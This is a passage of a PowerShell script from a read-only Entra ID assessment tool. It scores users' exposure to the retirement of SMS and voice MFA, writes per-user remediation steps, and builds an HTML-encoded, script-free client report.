        # Legacy per-user MFA state, when -IncludeLegacyPerUserMfa read it. Empty means it
        # was not read, which is the historical behaviour and still the default.
        #
        # A user enabled or enforced there is in scope for the retirement whatever the
        # modern policy says, so this counts as scope. Without it the tenant's real
        # exposure sits in Moderate looking like stale registrations, and the operator is
        # told to go and check a portal by hand.
        [string]$PerUserMfaState = ''
    )

    $legacyMfaInForce = $PerUserMfaState -in @('enabled', 'enforced')
    $legacyMfaConfirmedOff = $PerUserMfaState -eq 'disabled'
    $inScope = $InPolicyScope -or $legacyMfaInForce

    # Which scope caught the user changes the remediation, so the reason has to say. A
    # modern-policy user is a campaign target; a legacy per-user MFA user has to be moved
    # onto the modern policy first, because the campaign will not reach them where they are.
    $via = if ($InPolicyScope -and $legacyMfaInForce) { 'SMS/voice policy and legacy per-user MFA' }
    elseif ($InPolicyScope) { 'SMS/voice policy' }
    else { "legacy per-user MFA ($PerUserMfaState)" }

    if ($inScope -and $HasPhoneMethodRegistered -and -not $IsPasswordlessCapable) {
        if ($IsAdmin) { return @('Critical', "Privileged user is in scope via $via, has a phone method registered, and is not passwordless-capable.") }
        if ($UserType -eq 'Guest') { return @('High', "Guest is in scope via $via, has a phone method registered, and lacks a reported passwordless method; validate B2B passkey readiness.") }
        return @('High', "User is in scope via $via, has a phone method registered, and is not passwordless-capable.")
    }
    if ($inScope -and -not $IsPasswordlessCapable) {
        return @('High', "User is in scope via $via and is not passwordless-capable.")
    }
    if ($HasPhoneMethodRegistered -and -not $IsPasswordlessCapable) {
        # Moderate exists to say "there may be legacy per-user MFA here, go and look". Once
        # the run has actually looked and found none, saying it again sends a technician to
        # a portal to confirm something already confirmed.
        if ($legacyMfaConfirmedOff) {
            return @('Moderate', 'Phone method is registered outside every resolved scope, and legacy per-user MFA is disabled for this user; treat as a stale registration.')
        }
        return @('Moderate', 'Phone method is registered outside resolved modern policy scope; validate legacy per-user MFA exposure.')
    }
    if ($inScope -and $IsPasswordlessCapable) {
        return @('Low', "User is in scope via $via but already reports a policy-allowed passwordless method.")
    }
    if ($HasPhoneMethodRegistered -and $IsPasswordlessCapable) {
        return @('Low', 'Phone method remains registered, but user reports a policy-allowed passwordless method.')
    }
    return @('Informational', 'No resolved SMS/voice migration exposure.')
}

function Test-UpnExcluded {
    # Whether a UPN matches any operator-supplied exclusion pattern.
    #
    # Case-insensitive, because UPNs are. Matched anywhere in the string rather than
    # anchored, so '^svc-' anchors deliberately and 'svc-' catches the same accounts
    # wherever the prefix sits; anchoring is left to the operator writing the pattern.
    param(
        [Parameter(Mandatory)][AllowEmptyString()][AllowNull()][string]$UserPrincipalName,
        [AllowNull()][AllowEmptyCollection()][string[]]$Pattern
    )

    if (-not $Pattern -or $Pattern.Count -eq 0) { return $false }
    if ([string]::IsNullOrWhiteSpace($UserPrincipalName)) { return $false }

    foreach ($candidate in $Pattern) {
        if ([string]::IsNullOrWhiteSpace($candidate)) { continue }
        if ($UserPrincipalName -match $candidate) { return $true }
    }
    return $false
}

function Test-OnlyPhoneBasedMfa {
    # Microsoft's criterion for the 2027-02-01 blocking prompt: the user's only available
    # MFA method is SMS or voice. This is narrower than "not passwordless-capable", which
    # also sweeps up everyone holding Microsoft Authenticator push -- a method that is not
    # being retired and whose holders are not stopped at sign-in.
    #
    # Getting this wrong in the lenient direction costs somebody their Monday morning, so
    # a method this function does not recognise counts as not surviving.
    param(
        # Null as well as empty: a user with no registration-report row has no methods, and
        # that is an ordinary case rather than a caller error.
        [Parameter(Mandatory)][AllowNull()][AllowEmptyCollection()][string[]]$MethodsRegistered,
        [Parameter(Mandatory)][string[]]$PhoneMethods,
        [Parameter(Mandatory)][string[]]$SurvivingMfaMethods
    )

    if ($null -eq $MethodsRegistered) { return $false }

    $phone = @($MethodsRegistered | Where-Object { $_ -in $PhoneMethods })
    if ($phone.Count -eq 0) { return $false }

    $surviving = @($MethodsRegistered | Where-Object { $_ -in $SurvivingMfaMethods })
    return ($surviving.Count -eq 0)
}

function Get-RemediationStep {
    # The single source of the per-user next step. It reaches the CSV as the NextStep
    # column, the HTML report under each row's reason, and the opening line of every
    # ticket description, so the three deliverables cannot drift into recommending
    # different things for the same person.
    #
    # One sentence or two, imperative, specific to what this user actually has. A row
    # that says "High" and stops makes the reader work out the action themselves, which
    # is the part they are paying for and the part most likely to be got wrong.
    #
    # Policy scope, passwordless capability, and privilege are deliberately not parameters:
    # the risk band is already derived from all three, so taking them again would let a
    # caller pass a combination the band contradicts.
    param(
        [Parameter(Mandatory)][string]$Risk,
        [bool]$HasPhoneMethodRegistered,
        [string]$UserType,
        [string]$PhoneMethodsRegistered,

        # See Get-RiskAssessment. Empty means the legacy state was not read.
        [string]$PerUserMfaState = ''
    )

    # Named so the instruction says which registration to remove, not "the phone method".
    $methods = if ([string]::IsNullOrWhiteSpace($PhoneMethodsRegistered)) { 'the phone method' } else { $PhoneMethodsRegistered }

    # A user held in legacy per-user MFA needs one step before anything else works: the
    # modern registration campaign does not reach them, so a passkey push aimed at them
    # lands nowhere and the run after this one reports the same user unchanged.
    $legacyPrefix = if ($PerUserMfaState -in @('enabled', 'enforced')) {
        "This user is $PerUserMfaState in legacy per-user MFA. Convert them to the modern authentication methods policy first, or the registration campaign will not reach them. Then: "
    } else { '' }

    # Every sequence below registers the surviving method before removing the phone
    # method. The other order creates the lockout the whole exercise exists to prevent.
    switch ($Risk) {
        'Critical' {
            return $legacyPrefix + "Contact the user and schedule a session; do not leave a privileged account to a self-service nudge. Register a FIDO2 security key or platform passkey, confirm with a real test sign-in, then remove $methods. Check that the account recovery path does not also depend on a phone number, and if this is an emergency-access account, confirm at least one break-glass account uses a method outside the retirement scope."
        }
        'High' {
            if ($UserType -eq 'Guest') {
                return $legacyPrefix + "Include in the passkey registration campaign, but confirm this guest can register before committing to a date: B2B and internal guest passkey support follows a separate Microsoft timeline. Leave $methods in place until a surviving method is confirmed working."
            }
            if ($HasPhoneMethodRegistered) {
                return $legacyPrefix + "Include in the passkey registration campaign. Direct the user to register a passkey or Microsoft Authenticator for their device type, confirm the registration landed, then remove $methods."
            }
            return $legacyPrefix + 'Include in the passkey registration campaign. The user is in scope with no method that survives the retirement, so they will be auto-enabled and nudged on 2026-09-01 whether or not you act first.'
        }
        'Moderate' {
            # Two different instructions, because the run may already have answered the
            # question this band exists to raise. Sending somebody to a portal to confirm
            # something the tool confirmed is how a checked tenant still costs an afternoon.
            if ($PerUserMfaState -eq 'disabled') {
                return "No legacy per-user MFA exposure: this run read the per-user MFA state and it is disabled, so the phone registration is stale rather than a live sign-in path. Confirm a phishing-resistant method is registered, then remove $methods."
            }
            return "Check this user in the legacy per-user MFA service settings. If they are enabled for SMS or voice there, convert them to the modern authentication methods policy so the exposure becomes measurable, then remediate as High. If the registration is simply stale, remove $methods once a phishing-resistant method is confirmed. This run did not read that state; drop -SkipLegacyPerUserMfa to have it answered automatically."
        }
        'Low' {
            if ($HasPhoneMethodRegistered) {
                return "No action required before the retirement; the user already holds a surviving method. Optionally remove $methods to reduce account-recovery attack surface, which is worth doing independently of this change."
            }
            return 'No action required. The user is in scope but already holds a method that survives the retirement. Expect a registration nudge on 2026-09-01.'
        }
        default {
            return 'No action required. No resolved exposure to the SMS and voice retirement.'
        }
    }
}

function ConvertTo-SafeHtml {
    # Directory display names are attacker-influenceable in some tenants (self-service
    # profile edits, B2B invite metadata). An unencoded display name containing markup
    # would execute in the browser of whoever opens the report, which for a client
    # deliverable means the person you emailed it to. Encode everything.
    param([AllowNull()][object]$Value)

    if ($null -eq $Value) { return '' }
    return [System.Net.WebUtility]::HtmlEncode([string]$Value)
}

function Get-ExecutiveSummary {
    # Prose, generated from the same numbers as the cards. A client report that only
    # shows counts makes the reader do the interpretation, and the interpretation is the
    # part they are paying for. Returns an array of paragraphs.
    param(
        [Parameter(Mandatory)]$Summary,

        # Distinct users in SMS or voice scope. Passed in rather than derived from the
        # summary, because InSmsPolicyScope and InVoicePolicyScope overlap: a user
        # targeted by both methods appears in both counts, and adding them together
        # reports more users in scope than the tenant has.
        [Parameter(Mandatory)][int]$InScopeCount
    )

    $asInt = {
        param($value)
        $parsed = 0
        if ([int]::TryParse([string]$value, [ref]$parsed)) { return $parsed }
        return 0
    }

    $critical = & $asInt $Summary.Critical
    $high = & $asInt $Summary.High
    $moderate = & $asInt $Summary.Moderate
    $candidates = & $asInt $Summary.MigrationCandidates
    $assessed = & $asInt $Summary.EnabledUsersAssessed
    $inScope = $InScopeCount
    $ready = & $asInt $Summary.PasswordlessCapableInScope
    $missing = & $asInt $Summary.UsersMissingFromReport

    $paragraphs = [System.Collections.Generic.List[string]]::new()

    if ($candidates -eq 0) {
        $paragraphs.Add("No users resolved into SMS or voice policy scope, and no phone-based authentication methods are registered across the $assessed enabled users assessed. This tenant has no measurable exposure through the modern authentication methods policy.")
        $paragraphs.Add('That is not the same as no exposure. Legacy per-user MFA service settings are in scope for the retirement and cannot be read by this assessment. Confirm that population in the legacy MFA portal before treating this tenant as finished.')
        return $paragraphs
    }

    $blocked = $critical + $high
    $paragraphs.Add("$candidates of $assessed enabled users are migration candidates: they are targeted by the SMS or voice authentication methods policy, they have a phone-based method registered, or both.")

    if ($blocked -gt 0) {
        $paragraphs.Add("$blocked of them have no phishing-resistant method registered today, so they are the population a passkey campaign needs to reach.")
    }

    # The number that answers "will anybody actually be stuck on the Monday". Kept separate
    # from the risk bands because it is narrower: a user holding Microsoft Authenticator
    # push is not passwordless-capable and is also not blocked, since Authenticator is not
    # being retired. Conflating the two overstates the emergency by everyone in that group.
    # Read through the accessor: StrictMode throws on a missing property, and this function
    # is also handed summaries rebuilt from older exports that predate these fields.
    $stopped = & $asInt (Get-PropertyValue $Summary 'BlockedAtRetirement')
    $stoppedAdmins = & $asInt (Get-PropertyValue $Summary 'BlockedAdminsAtRetirement')

    if ($stopped -gt 0) {
        $sentence = "Of those, $stopped hold a phone number as their only method that satisfies MFA. These are the accounts that stop working on 1 February 2027: at their next sign-in they meet a passkey registration prompt they cannot skip, and until they complete it they cannot get in."
        if ($stoppedAdmins -gt 0) {
            $sentence += " $stoppedAdmins of them are privileged."
        }
        $paragraphs.Add($sentence)
        $paragraphs.Add('Anyone who cannot complete that registration at the moment they are stopped -- no compatible device to hand, signing in from a shared terminal, or on the phone to the help desk from an airport -- is unable to work until they can. Driving this number to zero before the date is the whole job; the other counts describe how much campaign work stands between here and that.')
    }
    elseif ($candidates -gt 0) {
        $paragraphs.Add('No user holds a phone number as their only method that satisfies MFA, so on current data nobody is stopped at sign-in on 1 February 2027. The population below still needs migrating, but the immediate lockout risk is clear.')
    }

    if ($critical -gt 0) {
        $word = if ($critical -eq 1) { 'account holds' } else { 'accounts hold' }
        $paragraphs.Add("$critical of those $word a privileged role. Privileged accounts are the first remediation priority: if one is blocked at sign-in and its recovery path also depends on a phone number, the result is an availability problem on top of an authentication problem. Confirm the emergency-access accounts specifically.")
    }

    if ($moderate -gt 0) {
        $paragraphs.Add("$moderate user(s) have a phone method registered but did not resolve into the modern policy scope. That pattern usually means legacy per-user MFA, which is equally in scope for the retirement and is not readable through the least-privilege Graph surface this assessment uses. Treat it as a finding to validate manually, not as a clean result.")
    }

    if ($inScope -gt 0) {
        $percent = [math]::Round(($ready / $inScope) * 100)
        $paragraphs.Add("$ready of the $inScope users in policy scope ($percent%) already hold a method that survives the retirement. That figure is the progress measure worth tracking between runs.")
    }

    if ($missing -gt 0) {
        $paragraphs.Add("$missing enabled user(s) had no row in the authentication methods registration report. Their registration fields default to 'not capable', so they are reported as more exposed rather than quietly dropped. Recently created accounts and reporting latency both produce this; re-run in 24 to 48 hours before acting on that subset.")
    }

    return $paragraphs
}

function New-HtmlReport {
    param(
        [Parameter(Mandatory)]$Summary,
        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
        [Parameter(Mandatory)][string]$Path,
        [string]$Customer,

        # Taken as a parameter rather than read out of the caller's scope. These file-writing
        # helpers are lifted into tests and into examples/New-ExampleOutput.ps1, where an
        # ambient read is a variable nobody can see being consulted -- and static analysis
        # flags it as dead in the caller, which is how it reached CI twice.
        [switch]$SkipAclHardening
    )

    # The assessment time, not the moment this HTML was written. In a real run they are
    # seconds apart, so nothing changes there -- but the report is a statement about when
    # the data was gathered, and the countdowns below are only honest measured from that.
    # It also makes the report a pure function of the summary, so regenerating the
    # published sample produces no diff and nobody learns to skip regenerating it.
    $now = if ($Summary.PSObject.Properties['AssessmentTimeUtc'] -and $Summary.AssessmentTimeUtc) {
        ([datetime]$Summary.AssessmentTimeUtc).ToLocalTime()
    } else { Get-Date }

    $autoEnableDate = [datetime]'2026-09-01'
    $retirementDate = [datetime]'2027-02-01'
    $providerDate = [datetime]'2026-10-30'
    $daysToAutoEnable = [math]::Max(0, [int]($autoEnableDate - $now).TotalDays)
    $daysToRetirement = [math]::Max(0, [int]($retirementDate - $now).TotalDays)

    $heading = if ($Customer) { $Customer } else { 'Microsoft Entra ID' }
    $title = if ($Customer) { "$Customer - Entra SMS/Voice Migration Impact" } else { 'Entra SMS/Voice Migration Impact' }

    $asInt = {
        param($value)
        $parsed = 0
        if ([int]::TryParse([string]$value, [ref]$parsed)) { return $parsed }
        return 0
    }

    $critical = & $asInt $Summary.Critical
    $high = & $asInt $Summary.High
    $moderate = & $asInt $Summary.Moderate
    $low = & $asInt $Summary.Low
    $candidates = & $asInt $Summary.MigrationCandidates
    $blockedAtRetirement = & $asInt (Get-PropertyValue $Summary 'BlockedAtRetirement')

    # Only actionable rows go in the tables. Low and Informational are in the CSV; putting
    # them here would bury the ten accounts that actually matter under four hundred that don't.
    $actionable = @($Rows | Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') })

    # Distinct users in either method's scope. Summing the two policy counts would
    # double-count anyone targeted by both.
    $inScopeCount = @($Rows | Where-Object { $_.InSmsPolicyScope -or $_.InVoicePolicyScope }).Count

    $summaryParagraphs = Get-ExecutiveSummary -Summary $Summary -InScopeCount $inScopeCount
    $summaryHtml = ($summaryParagraphs | ForEach-Object { "<p>$(ConvertTo-SafeHtml $_)</p>" }) -join "`n"

    # Proportional bar across the four bands. Pure CSS widths computed here, because the
    # report carries no JavaScript and has to render identically offline in five years.
    $barTotal = $critical + $high + $moderate + $low
    $barSegments = if ($barTotal -gt 0) {
        $segments = @(
            @{ Class = 's-crit'; Count = $critical; Label = 'Critical' }
            @{ Class = 's-high'; Count = $high; Label = 'High' }
            @{ Class = 's-mod'; Count = $moderate; Label = 'Moderate' }
            @{ Class = 's-low'; Count = $low; Label = 'Low' }
        )
        ($segments | Where-Object { $_.Count -gt 0 } | ForEach-Object {
            $percent = [math]::Round(($_.Count / $barTotal) * 100, 2)
            "<div class=""seg $($_.Class)"" style=""width:$percent%"" title=""$($_.Label): $($_.Count)""></div>"
        }) -join ''
    } else { '' }

    # One table per band rather than one long table. A technician works Critical to
    # completion before touching High, and the band boundary is where that decision is made.
    $bandSections = foreach ($band in @('Critical', 'High', 'Moderate')) {
        $bandRows = @($actionable | Where-Object Risk -eq $band)
        if ($bandRows.Count -eq 0) { continue }

        $bandClass = switch ($band) {
            'Critical' { 'crit' }
            'High' { 'high' }
            default { 'mod' }
        }

        $bandBlurb = switch ($band) {
            'Critical' { 'Privileged accounts, targeted by policy, with a phone method and no phishing-resistant alternative. Individual work, scheduled, verified with a real test sign-in.' }
            'High'     { 'Targeted by policy with no method that survives the retirement. Remediate as a scoped registration campaign rather than one ticket at a time.' }
            default    { 'A phone method is registered but the user is outside the resolved modern policy scope. Usually legacy per-user MFA. Validate this population manually before concluding it is unaffected.' }
        }

        $rowsHtml = foreach ($row in $bandRows) {
            $adminMark = if ($row.IsAdmin) { '<span class="admin">ADMIN</span>' } else { '' }
            $scope = @()
            if ($row.InSmsPolicyScope) { $scope += 'SMS' }
            if ($row.InVoicePolicyScope) { $scope += 'Voice' }
            $scopeText = if ($scope.Count -gt 0) { $scope -join ' + ' } else { 'not in AMP scope' }
            $phone = if ($row.PhoneMethodsRegistered) { $row.PhoneMethodsRegistered } else { 'none reported' }
            $pwlessClass = if ($row.IsPasswordlessCapable) { 'yes' } else { 'no' }
            $pwlessText = if ($row.IsPasswordlessCapable) { 'Yes' } else { 'No' }

            # Prefer the NextStep already on the row. Recomputing keeps the report working
            # when it is handed rows from an older export that predates the column.
            $nextStep = Get-PropertyValue $row 'NextStep'
            if ([string]::IsNullOrWhiteSpace($nextStep)) {
                $nextStep = Get-RemediationStep -Risk ([string]$row.Risk) `
                    -HasPhoneMethodRegistered ([bool]$row.PhoneMethodsRegistered) `
                    -UserType ([string]$row.UserType) `
                    -PhoneMethodsRegistered ([string]$row.PhoneMethodsRegistered)
            }

            @"
<tr>
<td class="name">$(ConvertTo-SafeHtml $row.DisplayName)$adminMark<div class="upn">$(ConvertTo-SafeHtml $row.UserPrincipalName)</div></td>
<td>$(ConvertTo-SafeHtml $row.UserType)</td>
<td>$(ConvertTo-SafeHtml $scopeText)</td>
<td class="mono">$(ConvertTo-SafeHtml $phone)</td>
<td class="$pwlessClass">$pwlessText</td>
<td class="reason">$(ConvertTo-SafeHtml $row.Reason)
<div class="next"><span class="next-l">Next step</span>$(ConvertTo-SafeHtml $nextStep)</div></td>
</tr>
"@
        }

        @"
<section class="band">
<h3 class="band-h $bandClass">$band <span class="band-n">$($bandRows.Count)</span></h3>
<p class="band-blurb">$(ConvertTo-SafeHtml $bandBlurb)</p>
<table>
<colgroup><col class="c-user"><col class="c-type"><col class="c-scope"><col class="c-phone"><col class="c-pwless"><col class="c-why"></colgroup>
<thead><tr>
<th>User</th><th>Type</th><th>AMP scope</th><th>Phone methods</th><th>Passwordless</th><th>Why, and what to do</th>
</tr></thead>
<tbody>
$($rowsHtml -join "`n")
</tbody>
</table>
</section>
"@
    }

    $findingsHtml = if ($actionable.Count -eq 0) {
        '<div class="empty"><strong>No Critical, High, or Moderate findings.</strong><br>Verify against the Entra portal, and check legacy per-user MFA service settings separately: that population is in scope for the retirement and is not readable from the Graph surface this assessment uses.</div>'
    }
    else {
        $bandSections -join "`n"
    }

    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- No scripts, no external requests. Defence in depth behind the HTML encoding:
     even if an encoding bug slipped through, nothing can execute or phone home. -->
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; form-action 'none'; base-uri 'none'">
<meta name="referrer" content="no-referrer">
<title>$(ConvertTo-SafeHtml $title)</title>
<style>
/* Light document, brand accents. This file gets emailed, archived, and printed to PDF;
   a dark background costs a reader half a toner cartridge and reads as a dashboard
   screenshot rather than a deliverable. */
:root {
  --navy: #0E1B2C; --navy-2: #16273D; --accent: #0F9D6E;
  --ink: #14202E; --ink-2: #4A5C70; --ink-3: #6E8095;
  --rule: #DDE4EC; --panel: #F5F8FB; --page: #FFFFFF;
  --crit: #C22B2B; --high: #C25E17; --mod: #A8820A; --low: #0F9D6E;
}
* { box-sizing: border-box; }
html { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
body { margin: 0; background: var(--page); color: var(--ink);
  font: 15px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }

.masthead { background: var(--navy); color: #fff; padding: 30px 0 26px;
  border-bottom: 4px solid var(--accent); }
.wrap { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
.eyebrow { font-size: 11px; letter-spacing: 2.2px; text-transform: uppercase;
  color: var(--accent); font-weight: 700; margin-bottom: 8px; }
h1 { font-size: 30px; margin: 0 0 6px; letter-spacing: -0.4px; font-weight: 650; }
.masthead .sub { color: #A9BDD2; font-size: 13.5px; }
.tag { display: inline-block; border: 1px solid var(--accent); color: var(--accent);
  border-radius: 3px; padding: 2px 9px; font-size: 10.5px; letter-spacing: 1.4px;
  font-weight: 700; vertical-align: 4px; margin-left: 10px; }

main { padding: 8px 0 60px; }
h2 { font-size: 12.5px; text-transform: uppercase; letter-spacing: 1.6px;
  color: var(--ink-3); margin: 42px 0 14px; font-weight: 700;
  padding-bottom: 8px; border-bottom: 1px solid var(--rule); }

.lede p { margin: 0 0 12px; font-size: 16px; line-height: 1.65; max-width: 74ch; }
.lede p:first-child { font-size: 17.5px; color: var(--ink); font-weight: 500; }

.clock { display: flex; gap: 14px; flex-wrap: wrap; margin: 18px 0 4px; }
/* Direct children only. A bare `.clock div` also matches the nested .d and .t blocks
   and paints a card border around each line inside the card. */
.clock > div { background: var(--panel); border: 1px solid var(--rule);
  border-left: 3px solid var(--accent); border-radius: 4px; padding: 13px 17px; flex: 1 1 240px; }
.clock .d { font-size: 21px; font-weight: 700; letter-spacing: -0.3px; }
.clock .t { font-size: 12px; color: var(--ink-2); margin-top: 3px; line-height: 1.45; }

/* The one number a reader should leave with. Given its own band above the risk cards
   because it answers a different question: not "how much work", but "who stops working". */
.headline { display: flex; align-items: center; gap: 22px; border: 1px solid var(--rule);
  border-left: 4px solid var(--crit); border-radius: 6px; padding: 20px 24px;
  background: var(--panel); }
.headline.good { border-left-color: var(--low); }
.headline .hn { font-size: 46px; font-weight: 700; line-height: 1; letter-spacing: -1.5px;
  color: var(--crit); font-variant-numeric: tabular-nums; }
.headline.good .hn { color: var(--low); }
.headline .ht { font-size: 13.5px; line-height: 1.55; color: var(--ink); max-width: 74ch; }

.bar { display: flex; height: 12px; border-radius: 3px; overflow: hidden;
  background: var(--panel); border: 1px solid var(--rule); margin: 4px 0 10px; }
.seg { height: 100%; }
.s-crit { background: var(--crit); } .s-high { background: var(--high); }
.s-mod { background: var(--mod); }  .s-low { background: var(--low); }
.legend { display: flex; gap: 18px; flex-wrap: wrap; font-size: 12px; color: var(--ink-2); }
.legend span { display: inline-flex; align-items: center; gap: 6px; }
.dot { width: 9px; height: 9px; border-radius: 2px; display: inline-block; }

.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
  gap: 12px; margin-top: 16px; }
.card { background: var(--panel); border: 1px solid var(--rule); border-radius: 5px;
  padding: 15px 17px; }
.card .n { font-size: 27px; font-weight: 700; line-height: 1.1; letter-spacing: -0.5px; }
.card .l { font-size: 10.5px; text-transform: uppercase; letter-spacing: 1.1px;
  color: var(--ink-3); margin-top: 6px; font-weight: 600; }
.card.crit .n { color: var(--crit); } .card.high .n { color: var(--high); }
.card.mod .n { color: var(--mod); }   .card.low .n { color: var(--low); }

dl { display: grid; grid-template-columns: 240px 1fr; gap: 0; margin: 0;
  border: 1px solid var(--rule); border-radius: 5px; overflow: hidden; }
dt { color: var(--ink-2); font-size: 12.5px; font-weight: 600;
  padding: 10px 16px; background: var(--panel); border-bottom: 1px solid var(--rule); }
dd { margin: 0; font-size: 13px; padding: 10px 16px; word-break: break-word;
  border-bottom: 1px solid var(--rule); }
dl > dt:last-of-type, dl > dd:last-of-type { border-bottom: 0; }

.band { margin-top: 30px; }
.band-h { font-size: 15px; margin: 0 0 4px; font-weight: 700; letter-spacing: 0.2px;
  padding-left: 11px; border-left: 4px solid var(--rule); }
.band-h.crit { border-left-color: var(--crit); color: var(--crit); }
.band-h.high { border-left-color: var(--high); color: var(--high); }
.band-h.mod  { border-left-color: var(--mod);  color: var(--mod); }
.band-n { background: var(--panel); border: 1px solid var(--rule); color: var(--ink-2);
  font-size: 11.5px; border-radius: 10px; padding: 1px 9px; margin-left: 6px;
  vertical-align: 2px; font-weight: 700; }
.band-blurb { font-size: 12.5px; color: var(--ink-2); margin: 6px 0 12px;
  padding-left: 15px; max-width: 88ch; }

.tablewrap { overflow-x: auto; }
/* Fixed layout so every band's table lines up with the others. With auto layout each
   table sizes to its own content and the columns visibly jump between bands. */
table { width: 100%; border-collapse: collapse; font-size: 13px; table-layout: fixed; }
col.c-user { width: 20%; } col.c-type { width: 6%; } col.c-scope { width: 10%; }
col.c-phone { width: 13%; } col.c-pwless { width: 12%; } col.c-why { width: 39%; }
/* Header labels are single words wider than their columns under fixed layout, which
   makes them overrun the next header instead of wrapping. */
th { text-align: left; font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.9px;
  color: var(--ink-3); border-bottom: 2px solid var(--rule); padding: 9px 10px; font-weight: 700;
  background: var(--panel); overflow-wrap: anywhere; }
td { border-bottom: 1px solid var(--rule); padding: 11px 10px; vertical-align: top; }
tbody tr:nth-child(even) td { background: #FAFCFE; }
.name { font-weight: 600; }
/* Guest UPNs carry the #EXT# suffix and run long; fixed layout needs an explicit
   instruction to break them rather than push the column open. */
.name, .upn, .mono { overflow-wrap: anywhere; }
.upn { font-weight: 400; color: var(--ink-3); font-size: 11.5px; margin-top: 2px; }
.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 11.5px; }
.reason { color: var(--ink-2); font-size: 12px; }
/* The next step is the operative half of this column, so it is set apart from the
   diagnosis above it rather than running on as one paragraph. */
.next { margin-top: 8px; padding-top: 8px; border-top: 1px dashed var(--rule);
  color: var(--ink); font-size: 12px; line-height: 1.5; }
.next-l { display: block; font-size: 9.5px; letter-spacing: 1px; text-transform: uppercase;
  color: var(--accent); font-weight: 700; margin-bottom: 3px; }
.yes { color: var(--low); font-weight: 700; } .no { color: var(--crit); font-weight: 700; }
.admin { background: var(--crit); color: #fff; font-size: 9px; font-weight: 700;
  padding: 2px 5px; border-radius: 2px; letter-spacing: 0.8px; margin-left: 7px;
  vertical-align: 1px; }
.empty { background: var(--panel); border: 1px solid var(--rule); border-radius: 5px;
  padding: 26px; color: var(--ink-2); font-size: 13.5px; line-height: 1.6; }

.note { background: var(--panel); border: 1px solid var(--rule);
  border-left: 3px solid var(--mod); border-radius: 4px; padding: 16px 22px;
  font-size: 13px; color: var(--ink-2); }
.note ul { margin: 0; padding-left: 18px; } .note li { margin-bottom: 9px; }
.note li:last-child { margin-bottom: 0; }
.note strong { color: var(--ink); }

.method { display: grid; grid-template-columns: 1fr 1fr; gap: 22px; font-size: 12.5px;
  color: var(--ink-2); }
.method h4 { font-size: 12px; text-transform: uppercase; letter-spacing: 1px;
  color: var(--ink); margin: 0 0 8px; }
.method ul { margin: 0; padding-left: 17px; } .method li { margin-bottom: 6px; }

footer { margin-top: 46px; padding-top: 18px; border-top: 1px solid var(--rule);
  color: var(--ink-3); font-size: 11.5px; line-height: 1.6; }

@media (max-width: 720px) {
  dl { grid-template-columns: 1fr; }
  dt { border-bottom: 0; padding-bottom: 2px; }
  .method { grid-template-columns: 1fr; }
}

@media print {
  @page { margin: 14mm; }
  body { font-size: 10.5pt; }
  .wrap { max-width: none; padding: 0; }
  .masthead { padding: 0 0 12px; background: #fff; color: var(--ink);
    border-bottom: 3px solid var(--navy); }
  .masthead .sub { color: var(--ink-2); }
  .eyebrow { color: var(--navy); }
  .tag { border-color: var(--ink-3); color: var(--ink-3); }
  h2 { margin-top: 22px; page-break-after: avoid; }
  .band, .card, .clock div, .note, .empty { page-break-inside: avoid; }
  .band-h { page-break-after: avoid; }
  /* Repeat column headers when a band's table spans pages, or page two is unreadable. */
  thead { display: table-header-group; }
  tr { page-break-inside: avoid; }
  a { text-decoration: none; color: inherit; }
}
</style>
</head>
<body>

<header class="masthead">
<div class="wrap">
<div class="eyebrow">Entra ID &middot; SMS and voice retirement</div>
<h1>$(ConvertTo-SafeHtml $heading)<span class="tag">READ-ONLY</span></h1>
<div class="sub">
Migration impact assessment &middot;
Tenant $(ConvertTo-SafeHtml $Summary.TenantId) &middot;
$(ConvertTo-SafeHtml $now.ToString('d MMMM yyyy, HH:mm')) local &middot;
$(ConvertTo-SafeHtml $Summary.EnabledUsersAssessed) enabled users evaluated &middot;
No tenant settings were changed
</div>
</div>
</header>

<main class="wrap">

<h2>Summary</h2>
<div class="lede">
$summaryHtml
</div>

<div class="clock">
<div><div class="d">$daysToAutoEnable days</div><div class="t"><strong>1 September 2026</strong> &mdash; users in SMS or voice scope are auto-enabled for passkeys and nudged to register at next MFA sign-in.</div></div>
<div><div class="d">$daysToRetirement days</div><div class="t"><strong>1 February 2027</strong> &mdash; Microsoft-provided SMS and voice delivery is retired. No opt-out. Also the deadline to have a customer-managed telecom provider configured.</div></div>
</div>

<h2>Stopped at sign-in on 1 February 2027</h2>
<div class="headline $(if ($blockedAtRetirement -gt 0) { 'bad' } else { 'good' })">
<div class="hn">$blockedAtRetirement</div>
<div class="ht">
$(if ($blockedAtRetirement -gt 0) {
"user$(if ($blockedAtRetirement -ne 1) { 's' }) hold a phone number as their only method that satisfies MFA. At their next sign-in after the retirement they meet a passkey registration prompt they cannot skip, and cannot work until they complete it. Drive this number to zero before the date."
} else {
'No user holds a phone number as their only method that satisfies MFA. On current data nobody is stopped at sign-in on the retirement date. The migration below still needs doing, but the immediate lockout risk is clear.'
})
</div>
</div>

<h2>Exposure</h2>
<div class="bar">$barSegments</div>
<div class="legend">
<span><i class="dot s-crit"></i>Critical $critical</span>
<span><i class="dot s-high"></i>High $high</span>
<span><i class="dot s-mod"></i>Moderate $moderate</span>
<span><i class="dot s-low"></i>Low $low</span>
</div>

<div class="grid">
<div class="card crit"><div class="n">$critical</div><div class="l">Critical</div></div>
<div class="card high"><div class="n">$high</div><div class="l">High</div></div>
<div class="card mod"><div class="n">$moderate</div><div class="l">Moderate</div></div>
<div class="card low"><div class="n">$low</div><div class="l">Low</div></div>
<div class="card"><div class="n">$candidates</div><div class="l">Migration candidates</div></div>
<div class="card"><div class="n">$(ConvertTo-SafeHtml $Summary.PasswordlessCapableInScope)</div><div class="l">Already passwordless</div></div>
</div>

<h2>Tenant configuration</h2>
<dl>
<dt>Registration campaign</dt><dd>$(ConvertTo-SafeHtml $Summary.RegistrationCampaignState)</dd>
